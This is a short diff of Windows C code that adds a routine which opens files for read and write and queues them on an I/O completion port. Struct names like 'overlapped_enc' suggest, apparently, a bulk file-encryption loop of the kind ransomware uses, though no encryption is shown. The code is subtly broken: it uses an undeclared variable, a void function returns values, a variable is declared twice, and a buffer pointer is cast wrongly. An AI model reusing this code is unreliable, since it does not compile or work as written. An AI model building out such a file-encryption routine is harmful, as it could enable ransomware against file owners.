@@ -18,7 +18,26 @@ return 1;
 void associate_file(char *filename)
 {
 HANDLE file = CreateFileA(filename,GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
-      
+      overlapped_enc *new_ovl = (overlapped_enc*)malloc(sizeof(overlapped_enc));
+      memset(new_ovl,0,sizeof(overlapped_enc));
+      ovl->file = file;
+      LARGE_INTEGER li;
+      GetFileSizeEx(file,&li);
+      ovl->file_size = li.QuadPart;
+      if(new_ovl->file_size > BLOCK_SIZE)
+      {
+new_ovl->operation = HANDLE_EOF;
+      }
+      else
+      {
+new_ovl->operation = READ;
+      }
+      CreateIoCompletionPort(CompletionPort,file,0,0);
+if(! PostQueuedCompletionStatus(CompletionPort,0,0,(LPOVERLAPPED *)new_ovl))
+{
+  return 1;    
+}
+  return 0;;
 
 
 }
@@ -58,7 +77,7 @@ ovl->operation = READ;
 void handle_eof(overlapped_enc *ovl)
 {
       memset(ovl->tempbuff,0,BLOCK_SIZE);
-BOOL res = ReadFile(ovl-> file,tempbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
+BOOL res = ReadFile(ovl->file,tempbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
 
 BOOL res = WriteFile(ovl->file,tempbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
 ovl->operation = CLOSE_IO;
